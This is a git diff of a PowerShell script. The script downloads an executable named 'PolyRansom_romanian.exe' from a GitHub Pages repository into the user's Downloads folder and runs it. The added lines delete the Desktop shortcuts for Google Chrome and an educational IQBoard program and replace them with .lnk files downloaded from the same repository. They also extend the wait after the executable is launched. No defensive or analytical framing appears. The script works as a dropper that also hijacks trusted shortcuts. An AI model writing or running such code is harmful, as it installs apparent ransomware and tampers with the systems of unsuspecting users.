@@ -2,6 +2,14 @@ $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $downloadPath)
+$chromeUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Google%20Chrome.download"
+$iqboardUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Software%20Educational%20IQBoard.download"
+
+$chromeFileName = "Google Chrome.lnk"
+$iqboardFileName = "Software Educational IQBoard.lnk"
+
+$chromePath = "$env:USERPROFILE\Desktop\$chromeFileName"
+$iqboardPath = "$env:USERPROFILE\Desktop\$iqboardFileName"
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -30,11 +38,23 @@ $form.Add_MouseDown({
 })
 $form.Show()
 
+if (Test-Path $chromePath) {
+    Remove-Item $chromePath -Force
+}
+
+if (Test-Path $iqboardPath) {
+    Remove-Item $iqboardPath -Force
+}
+
+Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath
+
+Invoke-WebRequest -Uri $iqboardUrl -OutFile $iqboardPath
+
 Start-Sleep -Seconds 10
 
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 60
     
     $process = Get-Process | Where-Object {$_.MainModule.FileName -eq $downloadPath}
     
